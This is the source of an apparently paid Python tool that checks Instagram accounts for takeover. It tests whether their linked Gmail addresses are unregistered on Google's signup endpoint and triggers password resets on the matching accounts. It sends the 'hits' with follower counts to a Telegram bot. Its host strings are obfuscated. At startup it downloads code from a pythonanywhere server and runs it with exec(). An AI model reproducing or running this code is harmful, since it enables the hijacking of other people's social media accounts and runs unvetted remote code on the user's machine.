import os as O0,sys as S0,re as R0,json as J0,string as ST0,random as RD0,hashlib as H0,uuid as U0,time as T0,gzip as G0,brotli as B0,secrets as SEC0,webbrowser as W0,requests as RQ0,cfonts as CF0
from datetime import datetime as DT0
from threading import Thread as TH0,Lock as LK0
from concurrent.futures import ThreadPoolExecutor as TPE0
from requests import post as PP0
from user_agent import generate_user_agent as GUA0
from random import choice as CH0,randrange as RR0
from cfonts import render as RN0,say as SY0
from colorama import Fore as FO0,Style as YL0,init as IN0

class D_Core:
    def __init__(self):
        self._s0 = 'ht'+'tp'+'s:'+'//'+'ac'+'co'+'un'+'ts'+'.g'+'oo'+'gl'+'e.'+'co'+'m'
        self._s1 = 'ac'+'co'+'un'+'ts'+'.g'+'oo'+'gl'+'e.'+'co'+'m'
        self._s2 = 'fi'+'le'+'s.'+'tx'+'t'
        self._s3 = '@g'+'ma'+'il'+'.c'+'om'
        self._x1 = 0
        self._x2 = 0
        self._x3 = 0
        self._x4 = 0
        self._x5 = 0
        self._m1 = {}
        self._c1 = '\033[1;31m'
        self._c2 = '\033[1;32m'
        self._c3 = '\033[1;33m'
        self._c4 = '\033[1;36m'
        self._t1 = None
        self._i1 = None
        self._l1 = LK0()
        self._t2 = 0
        self._c5 = None
        self._l2 = LK0()
        self.q1 = None 
        self._sess1 = RQ0.Session()
        self._sess2 = RQ0.Session()

    def F1(self, m_val):
      
        return core_F1(self, m_val)  # type: ignore

    def F2(self, f_val):
        return core_F2(self, f_val)  # type: ignore

    def F11(self, m_foo, m_bar):
        return core_F11(self, m_foo, m_bar)  # type: ignore

    def F3(self):
        n_val = T0.time()
        if n_val - self._t2 < 0.5: return
        self._t2 = n_val
        _cx = '\033[38;5;51m'
        _cg = '\033[38;5;46m'
        _cr = '\033[38;5;196m'
        _cp = '\033[38;5;129m'
        _cy = '\033[38;5;226m'
        _rst = '\033[0m'
        _bold = '\033[1m'
        
        # Stats panel colors
        GRAD2 = _cx
        INFO = _rst
        SUCCESS = _cg
        ACCENT = _cp
        WARNING = _cy
        DANGER = _cr
        PREMIUM = _cy
        BOLD = _bold
        
        _stats = f"{GRAD2} ────── @shinchanplugs | @vishaldied ────── {INFO}\n\n"
        _stats += f"  {SUCCESS}    → Hits              : {BOLD}{str(self._x2):>10}{INFO}\n"
        _stats += f"  {ACCENT}    → Valid Instagram   : {BOLD}{str(self._x5):>10}{INFO}\n"
        _stats += f"  {WARNING}    → Bad Instagram     : {BOLD}{str(self._x4):>10}{INFO}\n"
        _stats += f"  {DANGER}    → Bad Email         : {BOLD}{str(self._x3):>10}{INFO}\n"
        _stats += f"  {PREMIUM}    → Total Checked     : {BOLD}{str((self._x2+self._x3+self._x4)):>10}{INFO}\n\n"
        _stats += f"{GRAD2} ────── @shinchanplugs | @vishaldied ────── {INFO}\r"
        
        O0.system('clear' if O0.name == 'posix' else 'cls')
        S0.stdout.write(_stats)
        S0.stdout.flush()

    def D2(self):
        try:
            _a_chars = 'azertyuiopmlkjhgfdsqwxcvbn'
            _1_str = ''.join(CH0(_a_chars) for _ in range(RR0(6,9)))
            _2_str = ''.join(CH0(_a_chars) for _ in range(RR0(3,9)))
            _ho_str = ''.join(CH0(_a_chars) for _ in range(RR0(15,30)))
            _hdrs = {'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','User-Agent':str(GUA0())}
            _ru_l = f"{self._s0}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
            _r1 = RQ0.get(_ru_l, headers=_hdrs)
            _tk_val = R0.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', _r1.text).group(2)
            _c_dict = {'__Host-GAPS': _ho_str}
            _h2_dict = {'authority':self._s1, 'accept':'*/*', 'accept-language':'en-US,en;q=0.9', 'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf':'1', 'origin':self._s0, 'referer':('https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'), 'User-Agent':GUA0()}
            _d_dict = {'f.req':f'["{_tk_val}","{_1_str}","{_2_str}","{_1_str}","{_2_str}",0,0,null,null,"web-glif-signup",0,null,1,[],1]', 'deviceinfo':('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]')}
            _r2 = RQ0.post(f"{self._s0}/_/signup/validatepersonaldetails", cookies=_c_dict, headers=_h2_dict, data=_d_dict)
            _t_lst = str(_r2.text).split('",null,"')[1].split('"')[0]
            _ho_str = _r2.cookies.get_dict()['__Host-GAPS']
            with open(self._s2, 'w') as _f_io:
                _f_io.write(f"{_t_lst}//{_ho_str}\n")
        except Exception:
            self.D2()

    def F4(self):
        if self._c5: return self._c5
        with self._l2:
            if not self._c5:
                with open(self._s2, 'r') as _f_io:
                    self._c5 = _f_io.read().splitlines()[0]
        return self._c5

    def F6(self, e_val):
        try:
            if '@' in e_val: e_val = e_val.split('@')[0]
            _td = self.F4()
            _tl, _ho = _td.split('//')
            _c_dict = {'__Host-GAPS':_ho}
            _h_dict = {'authority':self._s1, 'accept':'*/*', 'accept-language':'en-US,en;q=0.9', 'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf':'1', 'origin':self._s0, 'referer':f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={_tl}", 'User-Agent':GUA0()}
            _p_dict = {'TL':_tl}
            _d_str = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{_tl}%22%2C%22{e_val}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            _r_val = PP0(f"{self._s0}/_/signup/usernameavailability", params=_p_dict, cookies=_c_dict, headers=_h_dict, data=_d_str)
            if '"gf.uar",1' in _r_val.text:
                with self._l1: self._x2 += 1
                self.F3()
                _u_val, _dm_val = (e_val + self._s3).split('@')
                self.F10(_u_val, _dm_val)
            else:
                with self._l1: self._x4 += 1
                self.F3()
        except:
            pass

    def F7(self, e_val):
        try:
            _x_res = self.F1(e_val)
            if _x_res:
                if self._s3 in e_val: self.F6(e_val)
                with self._l1: self._x5 += 1
                self.F3()
            else:
                with self._l1: self._x3 += 1
                self.F3()
        except:
            with self._l1: self._x3 += 1
            self.F3()

    def F8(self, u_val):
        try: return self.F2(u_val)
        except Exception as _e_exc: return f"Reset Error: {str(_e_exc)}"

    def F9(self, by_val):
        try:
            _b_val = int(by_val)
            if _b_val < 1279000: return 2010
            elif _b_val < 17750000: return 2011
            elif _b_val < 279760000: return 2012
            elif _b_val < 900990000: return 2013
            elif _b_val < 1629010000: return 2014
            elif _b_val < 2500000000: return 2015
            elif _b_val < 3713668786: return 2016
            elif _b_val < 5699785217: return 2017
            elif _b_val < 8507940634: return 2018
            elif _b_val < 21254029834: return 2019
            else:
                _ts_val = (_b_val >> 23) + 1314220021721
                return DT0.fromtimestamp(_ts_val / 1000).year
        except: return 2023

    def F10(self, u_val, dm_val):
        _a_dict = self._m1.get(u_val, {})
        _f_cnt = _a_dict.get('follower_count', 0)
        _fw_cnt = _a_dict.get('following_count', 0)
        _p_cnt = _a_dict.get('media_count', 0)
        _fn_str = _a_dict.get('full_name', '')
        _pk_id = _a_dict.get('id', 0)
        _yr_int = self.F9(_pk_id)
        self._x1 += 1
        _reset_status = self.F8(u_val)
        _ar_str = f"""
🔥 HIT NUMBER : {self._x1}
━━━━━━━━━━━━━━━━━
🔐  CREDENTIALS
┣👤 Username       : @{u_val}
┣📧 Email          : {u_val}@{dm_val}
┣📩 Reset Mail     : {_reset_status}
┗🔗 Profile Link   : instagram.com/{u_val}
━━━━━━━━━━━━━━━━━
📊 STATISTICS
┣👥 Followers      : {_f_cnt:,}
┣🔄 Following      : {_fw_cnt:,}
┗📸 Posts          : {_p_cnt}
━━━━━━━━━━━━━━━━━
✨ Powered By: @shinchanplugs
💻 Dev: @vishaldied
"""
        with open('anujhits.txt','a',encoding='utf-8') as _dfile:
            _dfile.write(_ar_str + "\n")
        try:
            _tg_url = f"https://api.telegram.org/bot{self._t1}/sendMessage"
            _tg_data = {"chat_id": self._i1, "text": _ar_str, "parse_mode": "HTML"}
            RQ0.post(_tg_url, json=_tg_data, timeout=10)
        except Exception as _tg_err:
            pass

    def F12(self):
        while True:
            try:
                if self.q1 is not None:
                    _e_raw = self.q1.get(timeout=5)
                    self.F7(_e_raw)
                    self.q1.task_done()
            except:
                pass

    def F14(self):
        # Expiration check
        _exp_date = DT0(2026, 4, 15, 18, 0, 0)  # yyyy=2026, mm=04, dd=15, hh=18 (6:00 PM), mm=00, ss=00
        _current_time = DT0.now()
        if _current_time > _exp_date:
            _cr = '\033[38;5;196m'   # red
            _cy = '\033[38;5;226m'   # yellow
            _rst = '\033[0m'         # reset
            _bold = '\033[1m'
            _line = ' ────── @shinchanplugs | @vishaldied ────── '
            print(f"\n{_bold}{_cr}{_line}{_rst}")
            print(f"{_bold}{_cr}  → ❌ This tool has expired{_rst} ❌")
            print(f"{_bold}{_cy}  → Contact @vishaldied for paid access.{_rst}")
            print(f"{_bold}{_cr}{_line}{_rst}\n")
            T0.sleep(1)
            S0.exit()
        
        S0.stdout.reconfigure(encoding='utf-8')
        O0.system('clear' if O0.name == 'posix' else 'cls')
        _cx = '\033[38;5;51m'   # cyan
        _cg = '\033[38;5;46m'   # green
        _cy = '\033[38;5;226m'  # yellow
        _cp = '\033[38;5;129m'  # magenta
        _rst = '\033[0m'        # reset
        print(f"{_cx}─────────────────────────────────────────────────────────────{_rst}")
        print(f"{_cp}               {_cy}Shinchan's High Follower Tool{_cp}")
        print(f"{_cx}─────────────────────────────────────────────────────────────{_rst}")
        print(f"{_cg}   Powered By: @shinchanplugs {_cy} | Developer : @vishaldied{_rst}")
        print(f"{_cx}─────────────────────────────────────────────────────────────{_rst}\n")
        print(f"{_cy}  → Enter Your Credentials:{_rst}")
        print(f"{_cx}────────────────────────────────────────────────────────────{_rst}")
        self._t1 = input(f'{_cp}         → Telegram Bot Token: {_rst}')
        print(f"{_cx}────────────────────────────────────────────────────────────{_rst}")
        self._i1 = input(f'{_cp}         → Chat ID: {_rst}')
        print(f"{_cx}────────────────────────────────────────────────────────────{_rst}")
        _mf_i = input(f'{_cp}         → Minimum Followers : {_rst}')
        print(f"{_cx}────────────────────────────────────────────────────────────{_rst}")
        _mp_i = input(f'{_cp}         → Minimum Posts : {_rst}')
        print(f"{_cx}────────────────────────────────────────────────────────────{_rst}")
        try: _mf_i = int(_mf_i)
        except: _mf_i = 30
        try: _mp_i = int(_mp_i)
        except: _mp_i = 0
            
        print(f"\n{self._c2} Starting with:{self._c1} Followers count : {_mf_i} | Post Count : {_mp_i}{self._c1}")
        T0.sleep(0.5)
        
        self._0x1c = "https://kevinpyxanujapi.pythonanywhere.com/api/get_core" 
        try:
            res = RQ0.post(self._0x1c, json={"auth": "kevinanujv1"}, timeout=15)
            if res.status_code == 200:
                exec(res.json()["core"], globals())
                init_core_queue(self)  # type: ignore 
            else:
                print("[-] License Expired or Invalid.")
                S0.exit()
        except Exception as e:
            print(f"[-] API connection failed: {str(e)}")
            S0.exit()

        self.D2()
        
        for _ in range(100):
            _t_th = TH0(target=self.F11, args=(_mf_i, _mp_i,), daemon=True)
            _t_th.start()
        for _ in range(200):
            _t_th = TH0(target=self.F12, daemon=True)
            _t_th.start()
            
        try:
            while True: 
                T0.sleep(1)
                self.F3() 
        except KeyboardInterrupt:
            S0.exit()

if __name__ == "__main__":
    _run_instance = D_Core()
    _run_instance.F14()
